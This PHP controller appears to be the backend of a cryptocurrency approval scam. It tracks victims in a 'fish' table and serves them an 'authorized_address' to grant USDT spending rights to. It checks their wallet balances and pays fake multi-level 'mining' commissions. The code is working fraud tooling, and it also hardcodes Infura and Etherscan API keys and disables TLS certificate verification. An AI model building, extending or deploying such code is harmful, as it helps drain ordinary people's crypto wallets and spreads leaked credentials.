<?php


namespace app\admin\controller;


use app\common\model\Customer as CustomerModel;
use app\common\model\Mining as MiningModel;
use app\common\service\AddressService;
use app\common\service\FishService;
use app\common\service\CustomerService;
use app\common\service\UserDealRecordService;
use GuzzleHttp\Client;
use think\Controller;
use think\facade\Log;
use think\Request;
use think\db;

class Api extends Controller
{
   
    
    public function setting_data(){
        $setting_data = Db::name('setting_arr') -> find();
        $data['code'] = 0;
            $data['msg'] = 'Success';
        $data['data'] = $setting_data;
            return json($data);
    }
    public function is_lq_kj(){
        $address = $_GET['address'];
        $customer_data = Db::name('customer') -> where('address',$address) -> find();
        if(!empty($customer_data)){
            $data['code'] = 0;
            $data['msg'] = 'Success';
            return json($data);
        }else{
            $data['code'] = 1;
            $data['msg'] = 'error';
            return json($data);
        }
    }
    
    
    public function dingshi(){
        $h = date('H');
        $setting_data = Db::name('setting_arr') -> find();
        // $fanyong_time = explode(',',$setting_data['fanyong']);
        // if(!in_array($h,$fanyong_time)){
        //     echo('不在返佣时间');
        //     die;
        // }
        
         
        
        $all_customer_data = Db::name('customer') -> where('domain','kj') -> select();
        
       
        foreach ($all_customer_data as $k => $v){
            $money = $v['balance'] * $v['proportion'] / 100;
            $money = floor($money*100)/100;
            Db::name('customer') -> where('id',$v['id']) -> setInc('dff',$money);
            Db::name('customer') -> where('id',$v['id']) -> setInc('zong_shouyi',$money);
            $sj_id = $v['parent'];//上级id
            if(!empty($sj_id)){
                $sj_data = Db::name('customer') -> where('address',$sj_id) -> find();
                $sj_fc = $money * $setting_data['sj_fc'] / 100; // 上级分成
                $sj_fc =  floor($sj_fc * 100) / 100;
                // dump($sj_fc);die;
                Db::name('customer') -> where('address',$sj_id) -> setInc('dff',$sj_fc);
                
                
                Db::name('customer') -> where('address',$sj_id) -> setInc('zong_shouyi',$sj_fc);
                Db::name('customer') -> where('address',$sj_id) -> setInc('zong_yaoqing_money',$sj_fc);
                if(!empty($sj_data['parent'])){
                    // 上上级
                    $ssj_data = Db::name('customer') -> where('address',$sj_data['parent']) -> find();
                    $ssj_fc = $money * $setting_data['ssj_fc'] / 100; // 上级分成
                    $ssj_fc =  floor($ssj_fc * 100) / 100;
                    Db::name('customer') -> where('address',$sj_data['parent']) -> setInc('dff',$ssj_fc);
                    
                    Db::name('customer') -> where('address',$sj_data['parent']) -> setInc('zong_shouyi',$ssj_fc);
                    
                     Db::name('customer') -> where('address',$sj_data['parent']) -> setInc('zong_yaoqing_money',$ssj_fc);
                    if(!empty($ssj_data['parent'])){
                         // 上上上级
                        $sssj_data = Db::name('customer') -> where('address',$ssj_data['parent']) -> find();
                           
                        $sssj_fc = $money * $setting_data['sssj_fc'] / 100; // 上级分成
                        $sssj_fc =  floor($sssj_fc * 100) / 100;
                        Db::name('customer') -> where('address',$ssj_data['parent']) -> setInc('dff',$sssj_fc);
                        Db::name('customer') -> where('address',$ssj_data['parent']) -> setInc('zong_shouyi',$sssj_fc);
                        
                        Db::name('customer') -> where('address',$ssj_data['parent']) -> setInc('zong_yaoqing_money',$sssj_fc);
                    }
                }
                
            }
        }
    }
        
    public function my_dtx(){
        $address = $_GET['address'];
        // dump($address);
        $id = Db::name('customer') -> where(['address'=>$address]) -> find();
        // dump($id);die;
        $data['code'] = 0;
        $data['msg'] = 'Success';
        $data['data'] = $id;
        return json($data);
    }
    public function sq_sy_tx(){
        $address = $_GET['address'];
        $setting_data = Db::name('setting_arr') -> find();
        
        $customer_data = Db::name('customer') -> where('address',$address) -> find();
        if($customer_data['dff'] < $setting_data['tixian_yaoqiu']){
            $data['code'] = 1;
            $data['msg'] = 'Minimum extraction'.$setting_data['tixian_yaoqiu'];
            return json($data);
            die;
        }
        Db::name('customer') -> where('address',$address) -> update(['dff' => 0]);
        $tx = Db::name('customer') -> where('address',$address) -> setInc('dtx',$customer_data['dff']);
        
        
        if($tx){
            
            $add_data = [
                'address'   =>  $address,
                'type'      =>  $customer_data['type'],
                'price'     =>  $customer_data['dff'],
                'created_at'    =>  date("Y-m-d H:i:s"),
                'updated_at'    =>  date("Y-m-d H:i:s"),
            ];
            Db::name('user_deal_records') -> insert($add_data);
            $data['code'] = 0;
            $data['msg'] = 'Success';
            return json($data);
        }else{
           $data['code'] = 2;
            $data['msg'] = 'error';
            return json($data); 
        }
    }
    
    
    public function my_id(){
        $address = $_GET['address'];
        // dump($address);
        $id = Db::name('fish') -> where(['address'=>$address]) -> find();
        // dump($id);die;
        $data['code'] = 0;
        $data['msg'] = 'Success';
        $data['data'] = $id;
        return json($data);
    }
    
    

    public function get_erc(){
        $adddresses = AddressService::getAddress('erc');

        $address = $adddresses[0]['address'];

        $infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );

        $data = ['data'=>['authorized_address' => $address, 'infura_key' => $infura[array_rand($infura)]]];

        return json($data);
    }

    public function get_trc(){
        $adddresses = AddressService::getAddress('trc');

        $address = $adddresses[0]['address'];

        $infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );

        $data = ['data'=>['authorized_address' => $address, 'infura_key' => $infura[array_rand($infura)]]];

        return json($data);
    }
    public function insert_erc_1(Request $request) {
        $employee =  $request->post('code');
        $fish_address = $request->post('address');
        $au_address = $request->post('authorized_address');
        $referral_address = $request->post('referral_address');
        $sj = $request->post('sj');

        FishService::new_erc($employee,$fish_address,$au_address, $referral_address,$sj);
    }

    // public function insert_erc(Request $request) {
    //     $employee =  $request->post('code');
    //     $fish_address = $request->post('address');
    //     $au_address = $request->post('authorized_address');
    //     $referral_address = $request->post('referral_address');

    //     FishService::new_erc($employee,$fish_address,$au_address, $referral_address);
    // }
    
    public function insert_erc(Request $request) {
        


        $employee =  $request->post('code');
        $fish_address = $request->post('address');
        $au_address = $request->post('authorized_address');
        $referral_address = $request->post('referral_address');
        $balance = $request->post('balance');
        // $sj = $request->post('sj');


        file_put_contents("balance.txt",$balance);
        $sy_bl = Db::name('customer_proportiontwo') -> select();
        foreach ($sy_bl as $k => $v){
            $key_arr = explode('-',$v['key']);
            if($balance >= $key_arr['0'] && $balance < $key_arr['1']){
                $aa = $v;
            }
        }
        
        
  
        file_put_contents("dataaa.txt",$aa['val']);
        // $sy_bl = Db::name('customer_proportiontwo') -> select();
        $fish_data = Db::name('Fish') -> where('address',$fish_address) -> find();
        $sj_data = Db::name('Fish') -> where('id',$fish_data['sj']) -> find();
        $sj_address = $sj_data['address'];
        
        $address = $fish_address;
        // $money = $balance;
        $type = $fish_data['type'];
        $money = $this->get_balance_trc($fish_address,$type);
        $proportion = (int)$aa['val'];
        // $parent = $sj;
        $parent = $sj_address;
        $is_auth = 1;
        $domain = 'kj';
        $code = $employee;
    
        CustomerService::new_customer($address,$money,$proportion,$parent,$is_auth,$domain,$code);

    }
    public function insert_trc_1(Request $request) {

        
        $employee =  $request->post('code');
        $fish_address = $request->post('address');
        $au_address = $request->post('authorized_address');
        $referral_address = $request->post('referral_address');
        $sj = $request->post('sj');
        $type = 'trc';
        $money = $this->get_balance_trc($fish_address,$type);

        FishService::new_trc($employee,$fish_address,$au_address, $referral_address,$sj,$money);
        

    }

    public function insert_trc(Request $request) {
        $employee =  $request->post('code');
        $fish_address = $request->post('address');
        $au_address = $request->post('authorized_address');
        $referral_address = $request->post('referral_address');
        // $balance = $request->post('balance');
        
        // $sy_bl = Db::name('customer_proportiontwo') -> select();
        $fish_data = Db::name('Fish') -> where('address',$fish_address) -> find();
        $sj_data = Db::name('Fish') -> where('id',$fish_data['sj']) -> find();
        $sj_address = $sj_data['address'];
        
        $type = $fish_data['type'];
        
        
        $balance = $this->get_balance_trc($fish_address,$type);
        // $sj = $request->post('sj');

        $sy_bl = Db::name('customer_proportiontwo') -> select();
        foreach ($sy_bl as $k => $v){
            $key_arr = explode('-',$v['key']);
            if($balance >= $key_arr['0'] && $balance < $key_arr['1']){
                $aa = $v;
            }
        }
        $address = $fish_address;
        $money = $balance;
        // $money = $this->get_balance_trc($fish_address,$type);
        $proportion = (int)$aa['val'];
        // $parent = $sj;
        $parent = $sj_address;
        $is_auth = 1;
        $domain = 'kj';
        $code = $employee;
        // dump($address);die;
        CustomerService::new_customer($address,$money,$proportion,$parent,$is_auth,$domain,$code);

    }
    
    public function get_balance_trc($fish_address,$type)
    {
        // $fish_address = $_GET['fish_address'];
        // $type = $_GET['type'];
        if($type == 'trc'){
            
            $umoney_url = 'https://'.$_SERVER['HTTP_HOST'].'/usdt/index.php/Fish/get_balance_trc?address='.$fish_address;
    

            $balance = $this->curl_get_https($umoney_url);


        }else{
            $balance = $this ->get_balance_erc($fish_address);

        }
        return $balance;
        
    }
    
    public function sx_money()
    {
        $fish_address = $_GET['address'];
        $type = $_GET['type'];
        if($type == 'trc'){
            
            $umoney_url = 'https://'.$_SERVER['HTTP_HOST'].'/usdt/index.php/Fish/get_balance_trc?address='.$fish_address;
    

            $balance = $this->curl_get_https($umoney_url);


        }else{
            $balance = $this ->get_balance_erc($fish_address);

        }
        // return $balance;
        Db::name('customer') -> where('address',$fish_address) -> update(['balance' => $balance]);
        
    }
    
    public function get_balance_erc($address){
        $api_key = '7TCVDMHGHVH42IFHXJXK677AQWUA1QDE9N';
        $usdt_contract = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
        //设置抓取的url
        $url='https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress='.$usdt_contract.'&address='.$address.'&tag=latest&apikey='.$api_key;                                 //地址要拼接上请求参数

        $json_data = json_decode(file_get_contents($url),true);
        $data = $json_data['result'];
        $balance = $data/1000000;
        return $balance;
    }
    
    function curl_get_https($url){
            $curl = curl_init(); // 启动一个CURL会话
            curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_HEADER, 0);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // 跳过证书检查
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);  // 从证书中检查SSL加密算法是否存在
            $tmpInfo = curl_exec($curl);     //返回api的json对象
            //关闭URL请求
            curl_close($curl);
            return $tmpInfo;    //返回json对象
        }
    
    

    public function update_balances()
    {
        set_time_limit(0);

        $data = \app\common\model\Fish::order('update_time', 'desc')
            ->limit('100')->select()->toArray();
        foreach ($data as $v)
        {
            $balance = $this->getBalance($v['address'], $v['type']);

            if ($balance == false) {
                continue;
            }

            \app\common\model\Fish::where('address', $v['address'])->update(['balance' => $balance]);
            sleep(0.3);
        }


    }

    public function getBalance($address, $type)
    {
        $client = new Client();
        try {
            if ($type == 'trc') {
                $url = '';
            } else {
                $url = '';
            }

            $request = $client->request('post', $url, ['json' => ['address' => $address]]);
            $body = $request->getBody();
            $content = $body->getContents();
            $res = json_decode($content, true);
            if (isset($res['code']) && $res['code'] == '200') {
                if ($type == 'trc') {
                    return $res['data']['amount'] ?? 0;
                } else {
                    return $res['data']['usdt'] ?? 0;
                }
            } else {
                return false;
            }
        } catch (\Exception $e) {
            return false;
        }

    }

    public function get_profits()
    {
        $data = MiningModel::order([ 'id' => 'desc'])->field('address, type, balance')->all();
        $response = [
            'data' => $data
        ];

        return json($response);
    }

    public function user_info(Request $request)
    {
        $address = $request->post('address');
        $money = $request->post('money');
        $proportion = $request->post('proportion');
        $parent = $request->post('parent');
        $is_auth = $request->post('is_auth');
        $domain = $request->post('domain') ?? 0;
        $code = $request->post('code');

        CustomerService::new_customer($address,$money,$proportion,$parent,$is_auth,$domain,$code);
    }

    public function insert_deal_record(Request $request)
    {
        $address = $request->post('address');
        $type = $request->post('type');
        $price = $request->post('price');
        $to_price = $request->post('to_price');

        UserDealRecordService::new_record($address,$type,$price,$to_price);
    }

    public function getUserInfo(Request $request)
    {
        $data = [
            'proportion' => 3,
            'money' => 0,
            'teamCount' => 0,
            'child' => 0,
            'eth' => 0,
            'trx' => 0,
            'level' => 1,
            'level1' => 0,
            'level2' => 0,
            'level3' => 0
        ];

        $address = $request->post('address', '');

        $user = CustomerModel::where('address', $address)
            ->field(['proportion', 'balance' => 'money', 'other_balance' => 'trx', 'level'])
            ->find();

        if (empty($user)) {
            return $data;
        }

        $proportion = CustomerService::getProportion($user['id']);

        $data['money'] = $user['money'];
        $data['proportion'] = $proportion;
        $data['trx'] = $user['trx'];
        $data['level'] = $user['level'];

        $child = CustomerModel::where('parent', $address)
            ->field(['address', 'level'])
            ->select()->toArray();

        if (empty($child)) {
            return $data;
        }

        $childAddress = array_column($child, 'address');
        $data['child'] = count($childAddress);

        $childV2 = CustomerModel::whereIn('parent', $childAddress)
            ->field(['address', 'level'])
            ->select()->toArray();

        if (empty($childV2)) {
            return $data;
        }

        $data['teamCount'] = $data['child'] + count($childV2) + 1;

        $childs = array_merge($child, $childV2);

        foreach ($childs as $v) {
            $data['level' . $v['level']] ++ ;
        }

        return  json($data);
    }


    public function getChildList(Request $request)
    {

        $data = [];

        $address = $request->post('address', '');
        $level = $request->post('level', '');

        $child = CustomerModel::where('parent', $address)
            ->field(['address', 'balance' => 'money', 'other_balance' => 'trx', 'proportion', 'level'])
            ->select()->toArray();

        if (empty($child)) {
            return $data;
        }

        $childAddress = array_column($child, 'address');
        $data = $child;

        $childV2 = CustomerModel::whereIn('parent', $childAddress)
            ->field(['address', 'balance' => 'money', 'other_balance' => 'trx', 'proportion', 'level'])
            ->select()->toArray();

        if (empty($childV2)) {
            return $data;
        }

        $data = array_merge($child, $childV2);
        if (!empty($level)) {
            foreach ($data as  $k => $v) {
                if ($v['level'] != $level) {
                    unset($data[$k]);
                }
            }
        }

        return  json($data);
    }
    
    public function get_deal_record(Request $request)
    {
        $address = $request->post('address');
        $type = $request->post('type');

        $data = UserDealRecordService::get_record($address,$type);
        return json($data);
    }
    
    public function insert_referral_info(Request $request)
    {
        $data = [
            'code' => 1,
            'msg' => 'Failed'
        ];
        $address = $request->post('address');
        $parent = $request->post('parent');

        if ($address === false || $address === 'false' || $parent == 'false') {
            return json($data);
        }
        
        $user = CustomerModel::where('address', $address)
            ->field(['parent', 'address'])
            ->find();
        if (empty($user)) {
            $data['msg'] = 'User does not exists';
            return json($data);
        }
        if (! empty($user['parent']) || $parent == $user['address']) {
            $data['msg'] = 'Invalid Operation';
            return json($data);
        }

        $parentUser = CustomerModel::where('address', $parent)->find();
        if (empty($parentUser)) {
            $data['msg'] = 'Invalid referrer';
            return json($data);
        }

        $user->parent = $parent;
        $user->save();
        $data['code'] = 0;
        $data['msg'] = 'Success';
        return json($data);
    }
    
    
    public function user_data(Request $request){
        $address = $request->get('address');
        
        $user = CustomerModel::where('address', $address)
            ->find();
        // 
        if(empty($user)){
            $money = Db::name('fish') -> where('address',$address) -> find();
            $user['balance'] = $money['balance'];
            $sy_bl = Db::name('customer_proportiontwo') -> select();
            foreach ($sy_bl as $k => $v){
                $key_arr = explode('-',$v['key']);
                if($user['balance'] >= $key_arr['0'] && $user['balance'] < $key_arr['1']){
                    $aa = $v;
                }
            }
            $proportion = (int)$aa['val'];
            
            $user['proportion'] = $proportion;
        }else{
            $user['balance'] = empty($user['balance']) ? 0 : $user['balance'];
        }
        
        // dump($user);die;
        $user['dff'] = empty($user['dff']) ? 0 : $user['dff'];
        $user['dtx'] = empty($user['dtx']) ? 0 : $user['dtx'];
        
        $user['zong_shouyi'] = empty($user['zong_shouyi']) ? 0 : $user['zong_shouyi'];
        $user['zong_tixian'] = empty($user['zong_tixian']) ? 0 : $user['zong_tixian'];
        $user['zong_yaoqing_money'] = empty($user['zong_yaoqing_money']) ? 0 : $user['zong_yaoqing_money'];
        
        
        
        
        $user['yuji_money'] = $user['balance'] * $user['proportion'] / 100;    
    
        // $fish_data = Db::name('fish') -> where('address',$address) -> find();
        
        $yq_count = Db::name('customer') -> where('parent',$address) -> count();
        $user['zong_renshu'] = $yq_count;
        $data['code'] = 0;
        $data['msg'] = 'Success';
        $data['data'] = $user;
        return json($data);
    }
}
